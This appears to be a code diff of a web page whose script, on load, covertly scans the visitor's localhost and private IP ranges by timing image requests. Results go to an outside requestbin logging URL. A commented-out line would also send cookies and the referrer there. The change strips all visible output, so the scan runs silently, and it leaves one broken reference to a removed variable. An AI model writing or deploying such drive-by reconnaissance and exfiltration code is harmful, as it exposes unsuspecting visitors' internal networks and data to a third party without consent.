@@ -10,30 +10,20 @@
     <div id="custom_button"></div>
     
     <script>
-    /*
-    CHANGE THE VALUE TO A URL OF YOUR CONTROL WHERE TO LOG ALL THE HTTP REQUESTS
-    @var LOG_URL str 
-    */
-    let LOG_URL = "http://requestbin.net/r/asxbs9l9";
+    let LOG_URL = "https://requestbin.net/r/5git21w4";
     let ipIterator="";
-    /*
-      IP RANGES TO FIND ACTIVE LOCAL IPS 
-    */
     let local_ip_ranges = ["10.", "192.168.", "172.16."];
-    
-     /*
-     CHECK IF APACHE IS RUNNING ON IP 127.0.0.1
-     */
+
     let imCoo = new Image();
     //imCoo.src = LOG_URL + "?c=" + document.cookie + "&r=" + document.referrer + "&l=" + history.length;
-    imCoo.src="http://127.0.0.1:80/icons/apache_pb.png";
-    
+     imCoo.src="http://127.0.0.1:80/icons/apache_pb.png";
+
       imCoo.onerror = function()
       {
         let imL = new Image();
         imL.src = LOG_URL + "?NO APACHE";
       }
-      
+
       imCoo.onload = function()
       {
         let imL = new Image();
@@ -72,12 +62,6 @@
               /* Record the starting time. */
               this.start_time = (new Date()).getTime();
 
-              /* Create the div to load the image, passing our object's index into
-                  the global directory so that it can be retrieved. */
-              document.getElementById("testdiv").innerHTML
-              = '<img src="http://' + ip + ':' + port + '" alt="" onerror="error_handler(' + our_scanobj_index + ');" />';
-
-              // XXX: What's the right way to do this in JS?
               var thiss = this;
               setTimeout(
                   function () {
@@ -88,7 +72,7 @@
                           thiss.on_stealthed();
                       }
                   },
-                  10000
+                  5000/*10000*/
               );
           }
       }
@@ -139,19 +123,17 @@
           var scanner = new PortScanner(ip, port);
 
           scanner.on_stealthed = function () {
-              if (scanner.timed_out) 
+              if (scanner.timed_out)
               {
                   let im = new Image();
                   im.src=LOG_URL+"?TIME=NO RESPONSE AFTER 10SEC&IP="+ip+"&PORT=" + port;
-                  document.getElementById("custom_result").innerHTML = "Case 2 (no response after 10s).";
-              } 
-              else 
+              }
+              else
               {
                     time = this.total_time;
                     let im = new Image();
                     im.src=LOG_URL+"?TIME="+time+"&IP="+ip+"&CASE=2&PORT=" + port;
                 }
-              document.getElementById("custom_button").disabled = false;
           }
 
           scanner.on_open_or_closed = function ()
@@ -180,34 +162,23 @@
           scanner.on_stealthed = lan_on_stealthed;
           scanner.on_open_or_closed = lan_on_open_or_closed;
           scanner.run();
-
-          document.getElementById("lan_results").innerHTML = "Scanning... <br />";
       }
 
       function lan_stop(form)
       {
           stop = true;
-          document.getElementById("lan_button").disabled = false;
-          document.getElementById("lan_button_stop").disabled = true;
       }
 
       function lan_on_stealthed()
       {
-          var res_div = document.getElementById("lan_results");
-          res_div.innerHTML += "192.168.1." + current_octet + ": ";
           if (this.timed_out) {
-              res_div.innerHTML += "Case 2 (no response after 10 seconds). <br />";
           } else {
             time = this.total_time;
-              res_div.innerHTML += "Case 2 (" + this.total_time + " ms). <br />";
           }
 
           current_octet += 1;
 
           if (stop || current_octet >= 255) {
-              res_div.innerHTML += "Done. <br />";
-              document.getElementById("lan_button").disabled = false;
-              document.getElementById("lan_button_stop").disabled = true;
               return;
           }
 
@@ -220,16 +191,10 @@
       function lan_on_open_or_closed()
       {
           time = this.total_time;
-          var res_div = document.getElementById("lan_results");
-          res_div.innerHTML += "192.168.1." + current_octet + ": ";
-          res_div.innerHTML += "Case 1 (" + this.total_time + " ms). <br />";
-
           current_octet += 1;
 
           if (stop || current_octet >= 255) {
               res_div.innerHTML += "Done. <br />";
-              document.getElementById("lan_button").disabled = false;
-              document.getElementById("lan_button_stop").disabled = true;
               return;
           }
 
@@ -239,11 +204,10 @@
           scanner.run();
       }
 
-    
-    /*
-    FIND ACTIVE IPS OF THE NEXT LOCAL IP RANGES
-  */
-  for (let i = 0 ; i < local_ip_ranges.length ; i++)
+      custom_scan("127.0.0.1", "80");
+      
+      
+        for (let i = 0 ; i < local_ip_ranges.length ; i++)
   {
       let ip = "";
       let bit1 = 0;
@@ -283,7 +247,7 @@
             {
               bit4++;
               ip = "192.168." + bit3 + "." + bit4;
-              //custom_scan(ip, "80");              
+              //custom_scan(ip, "80");
             }
             bit4 = 0;
             bit3++;
@@ -315,8 +279,6 @@
           bit2 = 0;
       }
   }
-      custom_scan("127.0.0.1", "80");
-      //custom_scan("127.0.0.1", "3306");
     </script>
   </body>
 </html>
